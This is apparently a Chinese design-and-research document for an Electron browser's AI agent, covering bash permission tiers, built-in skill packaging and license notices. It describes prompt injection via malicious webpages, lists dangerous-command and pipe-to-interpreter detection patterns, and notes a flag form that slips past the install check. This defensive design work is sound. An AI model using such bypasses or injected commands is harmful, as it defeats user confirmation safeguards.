**② §七（第 89-95 行）—— 安全边界（诚实声明）**

现有逐字 4 条：

```
- **read/write/edit**：硬边界，模型无论被何种提示注入诱导都无法越界
- **bash**：能力等同终端（确认后什么都行），安全依赖「卡片所见即所确认」；静态拆段无法覆盖全部 shell 语法（进程替换、命令替换 `$()` 等），白名单判定是「降低误执行概率」的启发式，**不是安全边界**
- **提示注入下的人因风险**：恶意网页诱导 AI 执行的 bash 命令同样会弹卡，但用户若不看内容直接点确认则防线失效——请养成读卡片上命令原文的习惯
- **OS 级隔离**（macOS sandbox-exec 限制 bash 可访问路径）为预留的后续增强方向，当前未实施
```

**建议新增第 5 条（Claude's Discretion 明确交 plan 期决定的那条）：**

```
- **安装档只审一级 bash 命令**：策略引擎看的是**用户在卡片上看到的那条命令**。若该命令内部再 `spawn` 子进程（例如技能自带的 `check_env.mjs` 内部用 `spawnSync` 调 `python3`），**二次调用不在策略视野内** —— 它们由用户对**第一条命令**的确认承担。这与「bash 能力等同终端」是同一件事的两面，不是额外缺陷。
```

**以及（若采纳 Pitfall 4 的 (C) 记录方案）：**

```
- **打包产物内含开发期文档**：当前 `app.asar` 包含仓库根的 `.planning/`（含安全研究文档）、`AGENTS.md`、`CLAUDE.md`、`tests/` 等开发期内容（electron-builder 在未配置 `files` allowlist 时的默认行为）。这是已知问题，归后续发布加固。
```

#### F-3. `AGENTS.md` 的改动点

**[VERIFIED: AGENTS.md:251]** 小节标题 `### AI 工作区与 Bash 权限（agent 根目录 + SDK 内置工具）`（项目规则里可见其完整现状）。

**建议补充的行（该小节现有内容里已有 "Bash 三档权限" 的完整描述，需同步 install 档）：**

该小节现有文本含：

```
- **Bash 三档权限**（`ai-bash-policy.js` 纯函数引擎，`evaluateBashCommand`）：① 白名单命中 → 免确认（主流前缀语义…）；② 默认 → 弹确认卡片；③ 危险段（`DANGEROUS_PATTERNS` 词边界正则：rm 全系/sudo/dd/kill/chmod/重定向覆盖系统路径等 + `DANGEROUS_INTERPRETERS` 管道右侧 sh/node/python 等）→ 强制确认，**进白名单也无效**。
```

**建议改为/补充：**

```
- **Bash 三档权限**（`ai-bash-policy.js` 纯函数引擎，`evaluateBashCommand`）：① 白名单命中 → 免确认（主流前缀语义…）；② 默认 → 弹确认卡片；③ 强制确认 —— 两个互不包含的触发源：**危险段**（`DANGEROUS_PATTERNS` 词边界正则：rm 全系/sudo/dd/kill/chmod/重定向覆盖系统路径等 + `DANGEROUS_INTERPRETERS` 管道右侧 sh/node/python 等）与**包管理器安装段**（`PACKAGE_MANAGER_INSTALL_PATTERNS`：npx / npm i|install|ci|exec / pnpm·yarn·bun add / pip install / uv·uvx / brew install|upgrade / cargo·go·gem install），两者**进白名单也无效**（`reason` 分别为 `danger` / `install`，均 `riskLevel: 'high'`）。
- **内置技能（随包分发，`skills-builtin/`）**：`asarUnpack` + `app.isPackaged` 路径分支（与 nodejieba 同款）；启动时按**单个技能目录粒度**自愈式同步到 `agent-workspace/managed-skills/<name>/`（临时目录 → rename → 回滚，无条件覆盖 + 覆盖前差异诊断）。**seeded 身份判定 = 扫描随包 `skills-builtin/` 的目录名集合**（每个目录须含 `SKILL.md`），**不落任何状态文件**；内置技能不能删改，只能禁用（`settings.aiSkills.disabled`），用户定制走 `skills/` 同名遮蔽。
- **技能不构成额外权限**：技能正文里写的任何「请执行某某命令」都要走同一套 bash 策略与确认卡片。`allowed-tools` **当前运行时不被强制，仅供参考** —— 任何展示它的地方都是虚假安全感。
- **随包静态技能目录的维护约定**：修改 `skills-builtin/**` 的任何内容（含 `scripts/`）后，必须同步核对 `THIRD_PARTY_NOTICES` 的「是否修改 / 修改说明」（P10 归属义务），并跑 `node tests/test-builtin-skills-seeder.js` 的零安装语义扫描。
```

**以及该小节末尾的"测试"行需补：**

```
- 测试：`node tests/test-agent-workspace.js`（沙箱/迁移，21 例）、`node tests/test-ai-bash-policy.js`（策略引擎，32 例 → 新增 install 档用例）、`node tests/test-builtin-skills-seeder.js`（播种/差异诊断/零安装语义，新增）
```

#### F-4. `THIRD_PARTY_NOTICES` 的形态与内容

**[VERIFIED: repo 根 `ls -1 | grep -i "third\|license\|notice"` → 无输出]** 该文件当前**不存在**（CONTEXT 已确认）。

**[VERIFIED]** 也没有仓库级 `LICENSE` 文件（`package.json:30` 声明 `"license": "MIT"`，但无 LICENSE 文件）。

**推荐形态（Claude's Discretion 交 plan 期，这里给依据）：**

| 维度 | 建议 | 依据 |
|------|------|------|
| **文件名** | **`THIRD_PARTY_NOTICES.md`（带 `.md`）** | ① 该内容有表格结构（逐技能五要素），Markdown 渲染可读性显著更好；② 仓库内所有文档都是 `.md`；③ 无扩展名的 `THIRD_PARTY_NOTICES` 更接近"纯文本法律文件"惯例，但本仓库没有其他先例要求这种形态；④ **注意 P10 的判据是"归属完整"而非文件名** —— 两者都满足，选可读性更好的 |
| **是否随 .app 分发** | **天然随包**（无需额外配置） | 见下 |
| **位置** | repo 根 | 与 `AGENTS.md` / `Makefile` 同级，开发者一眼可见 |

**"是否随包分发"的实证结论：** [VERIFIED] `files: []`（无 allowlist）意味着 repo 根的一切都进 `app.asar` —— 实测 asar 顶层含 `AGENTS.md` / `CLAUDE.md` / `README.md` / `Makefile`。**所以 `THIRD_PARTY_NOTICES.md` 放在 repo 根会自动随包**，不需要配置。**但要注意：如果 planner 采纳 Pitfall 4 的 `files` allowlist 方案 (A)，则必须显式把它列入 `files`，否则会被排除掉** —— 这直接违反 P10。

**建议的条目结构：**

```markdown
# 第三方内容归属声明（Third-Party Notices）

本文件记录 Realm Browser 随包分发的第三方内容及其许可证义务。
每项记录五个要素：来源仓库、固定 commit SHA、许可证、是否修改、修改说明。

---

## 1. find-skills（内置技能，随包分发）

| 要素 | 内容 |
|------|------|
| **来源仓库** | https://github.com/vercel-labs/skills |
| **固定 commit SHA** | `773fb2c7bbf16781670a3520affc4abd0c6151ae`（`skills/find-skills/SKILL.md` 最后改动，2026-07-10） |
| **许可证** | MIT |
| **是否修改** | **是（modified）** |
| **修改说明** | Realm 化改写版。原版引导使用 `npx skills` CLI 检索与安装技能（含 `-g` 全局安装与 `-y` 跳过确认的说明）；Realm 版**完全移除全部 CLI 与安装语义**，改为引导模型用 `web_fetch` 直接查询 GitHub 搜索 API 产出候选清单，安装由用户在设置页导入完成。正文语言改为中文，新增显式禁令段落。 |
| **许可证副本** | `skills-builtin/find-skills/LICENSE.txt`（随播种落至 `agent-workspace/managed-skills/find-skills/LICENSE.txt`） |

## 2. skill-creator（内置技能，随包分发）

| 要素 | 内容 |
|------|------|
| **来源仓库** | https://github.com/anthropics/skills |
| **固定 commit SHA** | `b0cbd3df1533b396d281a6886d5132f623393a9c`（`skills/skill-creator/SKILL.md` 最后改动，2026-03-06） |
| **许可证** | Apache License 2.0 |
| **是否修改** | **见 Q2 的决策**（无修改则 unmodified；若按 D-06 删除平台专有章节则为 modified） |
| **修改说明** | ... |
| **许可证副本** | `skills-builtin/skill-creator/LICENSE.txt`（Apache-2.0，11,357 字节） |

> **注：** 来源仓库根目录**没有**仓库级 LICENSE 文件（GitHub API 的 `license` 字段为 `null`）；
> 该技能的许可证声明位于技能目录内的 `LICENSE.txt`，本记录以此为准。

---

## 3. Python 运行时依赖（不由 Realm 分发）

skill-creator 的部分脚本需要 `pyyaml` 与 `anthropic`。**这些包由用户自行安装到其
Python 环境，不由 Realm 分发、不包含在本仓库或打包产物中**，故不适用本文件的归属义务。
`scripts/check_env.mjs` 会报告缺失的依赖并明确要求用户确认后自行安装
（并声明 `Do not auto-install dependencies from this skill.`）。
```

**"是否修改 / 修改说明"的写法要点：**

- **find-skills 必须是 `modified`**（D-17 明确要求）。修改说明要**具体到改了什么**，不能只写"已修改"。上表写法可作模板。
- **skill-creator 的 `modified` / `unmodified` 取决于 Q2 的决策**：
  - 若**逐字保留**上游 → `unmodified` + `LICENSE.txt` 原文保留。但**这与 D-06「仅做必要改写」冲突**（因为上游的 `## Claude.ai-specific instructions` / `## Cowork-Specific Instructions` / `## Package and Present` 三章在 Realm 语境下会误导模型调用不存在的工具）。
  - 若**按 B-2 的建议做最小必要改写** → 必须标 `modified`，并在修改说明里逐条列出（"删除 Claude.ai 与 Cowork 平台专有章节；改写 `present_files` 相关段落；新增 Environment Preflight 章节与 `scripts/check_env.mjs`；收缩 check_env 的 capability 分组"）。
  - **Apache-2.0 §4(b) 的义务是「必须使被修改的文件带有显著的修改声明」** —— 因此若改了，**除了本文件，还应在 `SKILL.md` 里加一行修改声明**（例如文首加 `> Modified by Realm Browser on 2026-09-11: see THIRD_PARTY_NOTICES.md.`）。这是 P10 的实质义务，不是可选项。

### G. 门禁映射（P1 / P10）

**ROADMAP 明确要求：门禁"不得跨阶段滑落"，本阶段只谈本阶段的两道门禁。**

```xml
<gate_mapping>

  <gate id="P1" level="S1" blocking="true"
        risk="内置 find-skills 逐字打包 = 随包分发一份「用 npx 绕过沙箱装任意代码」的说明书；npx 当前不在 bash 危险解释器清单且可被白名单永久免确认">
    <criterion_from_roadmap>
      内置技能文本零「执行外部安装」语义 + 包管理器安装档强制确认（白名单不可越过）
    </criterion_from_roadmap>

    <half id="P1-a" name="内置技能文本零安装语义">
      <owns_requirements>SEED-01, SEED-03</owns_requirements>
      <acceptance_assertions>
        <assertion>
          `<skills-builtin/find-skills/SKILL.md>` 与 `<skills-builtin/skill-creator/SKILL.md>`
          两文件全文对 A-4 的 FORBIDDEN_PATTERNS **零命中**（无豁免）。
        </assertion>
        <assertion>
          两个 `LICENSE.txt` 同样零命中（实测上游 Apache-2.0 文本本就不含这些模式）。
        </assertion>
        <assertion>
          `<skills-builtin>/**` 内**不存在** `npx skills` 的任意变体（含
          `npx skills add` / `npx skills find` / `npx skills init` / `npx skills update`）
          —— 这是 PITFALLS P1 的靶心原文。
        </assertion>
        <assertion>
          skills-builtin 的 `scripts/` 与 `resources/` 只允许命中**显式豁免清单**内的行
          （`check_env.mjs` 的 `installGuidance` 与 `Do not auto-install dependencies from this
          skill.` 两处 —— 语义是禁止安装，必须豁免；豁免在测试里写死并注释理由）。
        </assertion>
        <assertion>
          find-skills 正文包含显式禁令段（D-02），且**不含**任何「手动把目录放到 …」的兜底指引（D-03）。
        </assertion>
        <assertion>
          find-skills 的 `description` 为中文且面向用户（D-04），并且两个内置技能的
          frontmatter 都有 `disable-model-invocation: true`（SEED-04）。
        </assertion>
      </acceptance_assertions>
      <commands>
        <cmd>node tests/test-builtin-skills-seeder.js</cmd>
        <cmd>grep -rniE "npx|npm (i|install)|pip install|brew install|-g\b|-y\b|--yes" skills-builtin/*/SKILL.md</cmd>
        <cmd>grep -rn "npx skills" skills-builtin/ ; echo "exit=$?   # 期望 exit=1（无匹配）"</cmd>
      </commands>
    </half>

    <half id="P1-b" name="安装档强制确认（白名单不可越过）">
      <owns_requirements>SEC-01</owns_requirements>
      <acceptance_assertions>
        <assertion>
          `evaluateBashCommand('npm i x', ['npm *'])` → `{level:'confirm', reason:'install'}`
          —— **即白名单含 `npm *` 或 `npm` 也必须确认**（D-14 的核心判据）。
        </assertion>
        <assertion>
          `evaluateBashCommand('npx anything', [])` → `reason:'install'`。
        </assertion>
        <assertion>
          D-13 家族覆盖的每一族至少一条断言命中（npx / npm / pnpm / yarn / bun / pip /
          python -m pip / uv / uvx / brew / cargo / go / gem）。
        </assertion>
        <assertion>
          D-16 的只读反例全部不命中 install（`npm run|test|ls|view|audit|outdated`、
          `pnpm run`、`yarn run`、`brew info|list|search`、`pip list|show`、
          `cargo search`、`go list`、裸命令名）—— **反例断言是硬要求，缺则门禁不闭合**。
        </assertion>
        <assertion>
          `danger` 优先于 `install`：`evaluateBashCommand('sudo npm i x', [])` → `reason:'danger'`。
        </assertion>
        <assertion>
          `ai-manager.js` 的 `_createBashToolWithPolicy` 对 `reason === 'install'` 产生
          `riskLevel: 'high'` 与专属文案（D-15）—— 源码级断言（照
          `tests/test-ai-skills.js` 的 `methodBody()` 源码扫描先例）。
        </assertion>
        <assertion>
          既有 32 例中至少 30 例保持通过（另外 2 例若采用路线 (A) 则已被有意更新为完整形状）。
        </assertion>
      </acceptance_assertions>
      <commands>
        <cmd>node --test tests/test-ai-bash-policy.js</cmd>
        <cmd>node tests/test-ai-bash-policy.js 2>&1 | grep -E "^# (tests|pass|fail)"</cmd>
      </commands>
    </half>

    <closure_rule>
      **两半必须同阶段落地。** ROADMAP 与 CONTEXT 的 `specifics` 已明确：
      只改写文本不补安装档 → 用户把 `npx` 加进白名单即可永久免确认（PITFALLS P1 后果 1）；
      只补安装档不改写文本 → 随包分发了一份「怎么装任意代码」的说明书。
      任何一半缺失即 P1 未闭合，**不得记入「部分完成」**。
    </closure_rule>
  </gate>

  <gate id="P10" level="发布" blocking="true"
        risk="anthropics/skills 无仓库级 LICENSE，skill-creator 目录内为 Apache-2.0，逐字打包有 §4 标注义务">
    <criterion_from_roadmap>
      THIRD_PARTY_NOTICES 归属完整（来源仓库 + 固定 commit SHA + 许可证 + 是否修改 + 修改说明）
    </criterion_from_roadmap>

    <owns_requirements>SEED-05</owns_requirements>

    <acceptance_assertions>
      <assertion>
        repo 根存在 `THIRD_PARTY_NOTICES(.md)`，且**对每个内置技能各有一条记录**。
      </assertion>
      <assertion>
        每条记录**五要素齐全**：来源仓库 URL + 固定 commit SHA + 许可证 + 是否修改 + 修改说明。
        缺任一要素即 P10 不闭合（这是 ROADMAP 的阻断判据原文）。
      </assertion>
      <assertion>
        **find-skills 记录标注 `modified`** 且修改说明具体到「移除了 CLI 安装语义、改为
        web_fetch 检索、正文改中文、新增禁令段」（D-17 强制要求 modified）。
      </assertion>
      <assertion>
        commit SHA 与实测值一致：find-skills = `773fb2c7bbf16781670a3520affc4abd0c6151ae`；
        skill-creator = `b0cbd3df1533b396d281a6886d5132f623393a9c`。
        **且 SHA 是 `path=` 过滤取到的、不是仓库 HEAD。**
      </assertion>
      <assertion>
        每个内置技能目录内**保留上游 `LICENSE.txt`**，且**播种后仍在**
        （`managed-skills/<name>/LICENSE.txt` 存在 —— 整目录复制天然携带）。
      </assertion>
      <assertion>
        skill-creator 的 `LICENSE.txt` 内容为 Apache-2.0（非截断、非摘要）。字节数
        与上游一致（11,357）。
      </assertion>
      <assertion>
        若 skill-creator 被改写（Q2 决策为 modified），则 `SKILL.md` 内**另有显著的修改声明**
        （Apache-2.0 §4(b) 义务），并与 `THIRD_PARTY_NOTICES` 的修改说明一致。
      </assertion>
      <assertion>
        若采用含 `files` allowlist 的打包方案，`THIRD_PARTY_NOTICES.md` **必须在该 allowlist 内**
        （否则它会从分发物里被排除，P10 变成纸面合规）。
      </assertion>
    </acceptance_assertions>

    <commands>
      <cmd>test -f THIRD_PARTY_NOTICES.md && grep -c "commit\|SHA" THIRD_PARTY_NOTICES.md</cmd>
      <cmd>node tests/test-builtin-skills-seeder.js   # 内含归属五要素断言 + LICENSE 存在性断言</cmd>
      <cmd>ls -la skills-builtin/find-skills/LICENSE.txt skills-builtin/skill-creator/LICENSE.txt</cmd>
    </commands>
  </gate>

</gate_mapping>
```

**本阶段明确不涉及的门禁（不得声称覆盖）：** P2 / P3（description + body 扫描面，P3 的 name 冲突策略归 46+51）/ P4 / P8（P8 已由 46-04 的映射表交接）/ P9 —— 全部归属其他阶段。**planner 不得把它们的验收断言写进 Phase 47 的成功判据。**

## Code Examples

> 以下模式均已读源确认（`[VERIFIED]` 标注给出文件与行号），可直接被 planner 引用进任务动作。

### 1. 随包内置技能源目录解析（D-12）

**Source: `favorites-manager.js:287-299`（nodejieba 先例，逐字）**

```js
      if (app.isPackaged) {
        const dictDir = path.join(
          process.resourcesPath,
          'app.asar.unpacked', 'node_modules', 'nodejieba', 'submodules', 'cppjieba', 'dict'
        );
        nodejieba.load({
          dict: path.join(dictDir, 'jieba.dict.utf8'),
          hmmDict: path.join(dictDir, 'hmm_model.utf8'),
          userDict: path.join(dictDir, 'user.dict.utf8'),
          idfDict: path.join(dictDir, 'idf.utf8'),
          stopWordDict: path.join(dictDir, 'stop_words.utf8')
        });
      }
```

**Realm 版（含开发态回落 + 依赖注入以便纯 Node 测试）见 D-2 节。**

### 2. 幂等迁移先例（播种的失败处理契约）

**Source: `agent-workspace.js:130-148`（逐字）**

```js
function migrateAiMemory() {
  const legacy = getLegacyAiMemoryDir();
  const target = getAiMemoryDir();
  if (!fs.existsSync(legacy)) return;
  if (fs.existsSync(target)) return;
  try {
    fs.cpSync(legacy, target, { recursive: true });
    console.log('[Realm] AI 记忆已迁移至 agent-workspace/ai-memory');
  } catch (err) {
    console.error('[Realm] AI 记忆迁移失败（保留旧目录，下次启动重试）:', err.message);
  }
}
```

**播种应照抄的三条：** ① `fs.cpSync` 做递归复制；② `try/catch` + `console.error` + **不 throw**；③ 错误信息里带"下次启动重试"的语义。

### 3. 三档裁决流水线（install 档的插入点）

**Source: `ai-bash-policy.js:210-228`（逐字，见 Architecture Patterns → Pattern 3 的改造建议）**

### 4. 播种调用点（D-12 / SEED-02）

**Source: `main.js:4038-4043`（逐字）**

```js
  // 初始化 AI 工作区（agent 根目录）并一次性迁移旧版 AI 记忆目录
  // （必须在 aiManager 创建之前：sandbox env 与 ai-memory 新路径都依赖目录就位）
  agentWorkspace.ensureWorkspaceDir();
  agentWorkspace.migrateAiMemory();

  // 初始化 AI Manager（per Phase 19）
  aiManager = new AIManager();
```

**插入位置：`migrateAiMemory()` 之后、`new AIManager()` 之前。**

### 5. 诊断形状（播种诊断必须对齐）

**Source: `ai-skills-manager.js:255-263`（`toRealmDiag`，逐字）**

```js
function toRealmDiag(d) {
  return {
    level: d.type === 'warning' ? 'warning' : 'error',
    code: d.code,
    message: d.message,
    path: d.path,
    source: d.source,
  };
}
```

**Source: `ai-skills-manager.js:499-506`（限额族带可操作字段，逐字）**

```js
    const oversizeDiags = oversize.map((n) => ({
      level: 'error',
      code: 'realm_skill_md_too_large',
      message: `SKILL.md 超过正文上限：限额 ${n.limit} 字节，当前 ${n.currentValue} 字节（${n.path}）`,
      path: n.path,
      limit: n.limit,
      currentValue: n.currentValue,
    }));
```

**Source: `ai-skills-manager.js:530-533`（warning 级诊断给出"正确做法"的写法，逐字）**

```js
        _cache.diagnostics.push({
          level: 'warning',
          code: 'realm_layout_violation',
          message: `技能 "${entry.skill.name}" 的布局不符合契约：实际 ${entryPath}；技能必须放在 <扫描根>/<技能名>/SKILL.md，不能有中间层目录（正确位置示例：${suggested}）`,
          path: entryPath,
```

### 6. 扫描根过滤（确认 `.seed.json` 无影响的依据）

**Source: `ai-skills-manager.js:143-153`（逐字）**

```js
    async listDir(p, abortSignal) {
      const res = await sandboxEnv.listDir(p, abortSignal);
      if (!res || res.ok !== true) return res; // 不吞错：原样透传失败 Result
      if (!isScanRoot(p)) return res;
      const dirs = [];
      for (const entry of res.value) {
        if (entry.kind === 'directory') dirs.push(entry);
        else droppedNotices.push({ path: entry.path, kind: entry.kind });
      }
      return { ok: true, value: dirs };
    },
```

### 7. SDK 在技能目录内的发现顺序（确认 LICENSE.txt / scripts/ 被跳过的依据）

**Source: `node_modules/@earendil-works/pi-agent-core/dist/harness/skills.js:87-127`（逐字节选）**

```js
    const entries = entriesResult.value;
    for (const entry of entries) {
        if (entry.name !== "SKILL.md")
            continue;
        const fullPath = entry.path;
        const kind = await resolveKind(env, entry, diagnostics);
        if (kind !== "file")
            continue;
        const relPath = relativeEnvPath(rootDir, fullPath);
        if (ignoreMatcher.ignores(relPath))
            continue;
        const result = await loadSkillFromFile(env, fullPath, dirInfo.name);
        if (result.skill)
            skills.push(result.skill);
        diagnostics.push(...result.diagnostics);
        return { skills, diagnostics };          // ← 找到 SKILL.md 即 return，不深入子目录
    }
    for (const entry of entries.sort((a, b) => a.name.localeCompare(b.name))) {
        if (entry.name.startsWith(".") || entry.name === "node_modules")
            continue;
        const fullPath = entry.path;
        const kind = await resolveKind(env, entry, diagnostics);
        if (!kind)
            continue;
        const relPath = relativeEnvPath(rootDir, fullPath);
        const ignorePath = kind === "directory" ? `${relPath}/` : relPath;
        if (ignoreMatcher.ignores(ignorePath))
            continue;
        if (kind === "directory") {
            const result = await loadSkillsFromDirInternal(env, fullPath, false, ignoreMatcher, rootDir);
            skills.push(...result.skills);
            diagnostics.push(...result.diagnostics);
            continue;
        }
        if (kind !== "file" || !includeRootFiles || !entry.name.endsWith(".md"))
            continue;
```

**三条结论：** ① 非 `SKILL.md` 的 entry 被 `continue` 静默跳过，**零诊断**；② 找到 `SKILL.md` 后**立即 return**，`scripts/` 从不被遍历；③ 点前缀 entry 在 SDK 层也被跳过（`entry.name.startsWith(".")`）。

### 8. 测试脚手架（播种与技能的临时目录注入）

**Source: `tests/test-ai-skills.js:24-46`（逐字）**

```js
/** 建一次性临时根目录并在测试结束后清理 */
function withTempRoot(t) {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'realm-skills-test-'));
  t.after(() => {
    fs.rmSync(dir, { recursive: true, force: true });
    workspace.setWorkspaceDir(null);
    aiMemoryManager.setBaseDir(null);
    // 模块级 _cache 跨用例污染会让后续「空技能集」断言假失败
    aiSkills._resetCacheForTest();
  });
  workspace.setWorkspaceDir(dir);
  aiMemoryManager.setBaseDir(dir);
  return dir;
}

/** 写入一个契约布局技能：<scannedDir>/<name>/SKILL.md */
function writeSkill(scannedDir, name, { description = `${name} 技能描述`, body = `# ${name}\n\n正文内容\n` } = {}) {
  const dir = path.join(scannedDir, name);
  fs.mkdirSync(dir, { recursive: true });
  const file = path.join(dir, 'SKILL.md');
  fs.writeFileSync(file, `---\nname: ${name}\ndescription: ${description}\n---\n\n${body}`);
  return file;
}
```

**Source: `tests/test-ai-skills.js:48-73`（源码扫描型断言的辅助函数 —— P1-a 的"源码级断言"要用到）**

```js
/** 读取仓库根源码（源码扫描型断言用） */
function readSource(file) {
  return fs.readFileSync(path.join(__dirname, '..', file), 'utf8');
}

/** 取函数体文本（从 `function <name>(` 到下一个行首 `}`） */
function functionBody(source, name) {
  const start = source.indexOf(`function ${name}(`);
  assert.ok(start >= 0, `源码中应存在 function ${name}(`);
  const end = source.indexOf('\n}', start);
  return source.slice(start, end);
}

/**
 * 取类方法体文本（支持 `async <name>(` / `function <name>(` / 两空格缩进的 `<name>(`）
 */
function methodBody(source, name) {
  let start = source.indexOf(`async ${name}(`);
  if (start < 0) start = source.indexOf(`function ${name}(`);
  if (start < 0) start = source.indexOf(`\n  ${name}(`);
  assert.ok(start >= 0, `源码中应存在方法 ${name}(`);
  const end = source.indexOf('\n  }', start);
  return source.slice(start, end);
}
```

**Source: `tests/test-agent-workspace.js:21-32` 的沙箱 env 构造先例** —— `tests/test-ai-skills.js:81` 的用法：

```js
    const env = await workspace.createSandboxEnv({ cwd: root });
    await aiSkills.refreshSkills(env, {
      rootDirs: [workspace.getManagedSkillsDir(), workspace.getSkillsDir()],
    });
```

**注意 `rootDirs` 的顺序是 `[managedDir, userDir]`**（`ai-skills-manager.js:443-444` 据此分配 `source`）。

### 9. `asar` 目录清单解析（Pitfall 4 的验证工具）

**无依赖，纯 Node**（我在本次会话中实际用它对已构建的 app.asar 做取证）：

```js
// 用法: node -e "..." 或写成 scripts/verify-asar-files.js
const fs = require('fs');
const asarPath = process.argv[2];   // e.g. dist/mac-arm64/Realm.app/Contents/Resources/app.asar

const fd = fs.openSync(asarPath, 'r');
const b = Buffer.alloc(16);
fs.readSync(fd, b, 0, 16, 0);
const headerSize = b.readUInt32LE(12);
const hb = Buffer.alloc(headerSize);
fs.readSync(fd, hb, 0, headerSize, 16);
const header = JSON.parse(hb.toString('utf8'));

function list(node, prefix, out) {
  for (const [k, v] of Object.entries(node.files || {})) {
    const p = prefix ? prefix + '/' + k : k;
    if (v.files) list(v, p, out); else out.push(p);
  }
  return out;
}

const all = list(header, '', []);
console.log('顶层:', Object.keys(header.files).sort().join(', '));
console.log('总文件数:', all.length);
console.log('.planning/ 文件数:', all.filter((x) => x.startsWith('.planning/')).length);
console.log('skills-builtin/ 文件数:', all.filter((x) => x.startsWith('skills-builtin/')).length);
```

## State of the Art

| 旧做法 | 当前做法 | 变更时点 | 影响 |
|--------|----------|----------|------|
| 内置技能以"版本戳登记表 + 未修改才覆盖"升级（O4 原始设想） | **每次启动无条件覆盖 + 覆盖前差异诊断 + seeded 身份扫随包目录名**（D-08/D-09/D-11） | Phase 47 讨论（2026-09-11） | 零状态文件、抗删改、三环境不分叉；代价是用户手改内置技能会被静默覆盖（用 warning 诊断补偿），定制通道收窄为 `skills/` 同名遮蔽 |
| find-skills 用 `npx skills` CLI 检索并安装技能 | **零安装 + 只读网络发现**（`web_fetch` 打 GitHub 搜索 API，输出候选清单，用户在设置页导入） | Phase 47 讨论（2026-09-11） | 消除了 P1 的 RCE 分发面；代价是能力降级（不能自动安装），且安装入口在 Phase 50 才存在（D-03 已接受该中间态） |
| bash 只有 `danger` 一个"白名单不可越过"的强制确认源 | **新增 `install` 档，与 danger 平行、语义分离，同样白名单不可越过** | Phase 47（本阶段） | `npx` / `npm i` 从"可被白名单永久免确认"变为"永远弹高风险卡片" |
| `bash` 工具描述只提"危险命令（rm/sudo/kill 等）" | 追加"包管理器安装命令（npx/npm i/pip install/brew install 等）" | Phase 47（本阶段） | 模型能看到策略全貌，减少"被强制确认后反复重试" |

**Deprecated/outdated:**

- **`npx skills` CLI 路线**：本次被 D-01 移除。用户 2026-09-11 明确要求**记入里程碑作为后续改版项**（`<deferred>` 已记录），前置条件是先引入 OS 级隔离（`sandbox-exec` / bubblewrap 等真沙箱）。**不得在本阶段或后续阶段无前置条件地恢复。**
- **CONTEXT 中"29 例"的测试数字**：实测已是 **32 例**（Phase 46 后的增补）。以 `node --test` 输出为准。
- **`allowed-tools` 的执行层语义**：SDK `@earendil-works/pi-agent-core@0.84.3` 的 `Skill` 接口根本没有该字段（Phase 46 已在 `docs/product/ai-skills.md §六` 写明）。本阶段只做文档免责声明（D-18），**不得在任何 UI 制造"该技能只能用这些工具"的虚假安全感**；解析归 Phase 51（O5）。

## Assumptions Log

> 用户确认清单 —— 下表中每条 `[ASSUMED]` 的claim都需要在形成锁定决策前确认。

| # | Claim | Section | Risk if Wrong |
|---|-------|---------|---------------|
| A1 | **不存在可无鉴权查询的独立 Agent-Skills 注册表**（我只实测了 GitHub API；未穷举其他注册表）。D-01 提到的"技能注册表"建议**不写进正文**，只写 GitHub 搜索 API | A-2 | 若正文写了第二个端点而它实际不可用，模型会在该端点反复失败，find-skills 功能部分失效。**缓解：只写已实测的端点。** |
| A2 | **`make install-nightly` 会同样应用 `asarUnpack`**（因为它继承 `package.json` 的 `build`，`--config.*` 只覆盖指定键） | D-3 | 若 Nightly 构建未解包 `skills-builtin/`，Step 2 的第 ① 项证据会缺失，需要退回用 `make install`（伴随用户实例停止的成本）。**缓解：Step 2 里同时跑 ① 与 ② 两条证据，任一缺失即停下来诊断。** |
| A3 | **`require('electron').app.isPackaged` 在函数体内惰性求值总是可用**（nodejieba 先例是在函数内读的，但该函数在启动后才被调用） | D-2 | 若在 `app.whenReady` 之前调用会抛错，播种失败。**缓解：播种调用点已定在 `main.js:4041` 之后（whenReady 内），且写法把 `require('electron')` 放在函数体内。** |
| A4 | **`skills-builtin/**` 的 glob 会覆盖任意深度嵌套**（由 `node_modules/nodejieba/**` 解包出 `submodules/cppjieba/dict/*` 三层嵌套推断） | B-5 | 若 `**` 只覆盖一层，`skill-creator/scripts/*.py` 会缺失，技能脚本不可用。**缓解：构建后用 Pitfall 4 的 asar 解析脚本 + `ls -R app.asar.unpacked/skills-builtin/` 实测。** |
| A5 | **`stripLeadingQuotes` 的位置（匹配前归一化）不会破坏既有 32 例**（本次只对 `matchInstall` 单独测过，未接入 `evaluateBashCommand` 全链路回归） | E-1 | 若某条既有断言依赖精确的 `normalizeSegment` 输出，接入后可能改判。**缓解：落地后立刻跑 `node --test tests/test-ai-bash-policy.js` 全绿。** 另一条更保守的选择是把引号剥离只用在 `matchInstall` 内部（不污染 `matchDangerous` / `matchesWhitelist`），**建议就采用这个更保守的形态**。 |
| A6 | **`npm --prefix X i Y` 这类取值旗标形态无法覆盖，属可接受的启发式缺口** | E-1 / Pitfall 8 | 有人可用该形态绕过。**评估：绕过需要用户自己写这条命令（AI 主动写这种形态的概率极低），且确认卡片仍会弹（reason 会是 `default` 而非 `allow`）—— 除非用户恰好把 `npm --prefix` 加进白名单。风险有限，写进诚实边界即可。** |
| A7 | **`THIRD_PARTY_NOTICES.md` 采用 Markdown + repo 根**（Claude's Discretion 交 plan 期） | F-4 | 无实质风险（P10 判据是"归属完整"不是文件名）。若 planner 更倾向无扩展名文件，同样满足。 |
| A8 | **skill-creator 的有必要改写（删除 Claude.ai / Cowork / `present_files` 章节）构成 Apache-2.0 意义上的 `modified`** | F-4 / Q2 | 若判为 unmodified 而不加修改声明，**可能违反 Apache-2.0 §4(b)**。**缓解：见 Q2 —— 建议无论如何都标 modified 并加声明行，这是 fail-safe 方向。** |
| A9 | **`realm-nightly` 的 userData 路径是 `~/Library/Application Support/realm-nightly/`**（来自 AGENTS.md 的环境隔离表，未在本次会话实测该目录存在） | D-3 | 验证命令的路径写错。**缓解：Step 2 执行前先 `ls ~/Library/Application\ Support/` 确认实际目录名。** |
| A10 | **本阶段不需要 `package-legitimacy check`**（零新增 npm 依赖；skill-creator 的 Python 依赖由用户自备、不随包分发） | Package Legitimacy Audit | 若 planner 决定把 `yaml` 提升为直接依赖（O5，CONTEXT 明确归 Phase 51），则需重新评估。**本阶段不引入。** |

**若 planner 认为上表某条的验证成本低于其风险，建议优先验证 A4（asarUnpack 嵌套）与 A5（既有测试回归）** —— 这两条的失败会在执行期直接暴露（技能不可用 / 测试红），是计划里最值得加"验证步骤"的地方。

## Open Questions (RESOLVED)

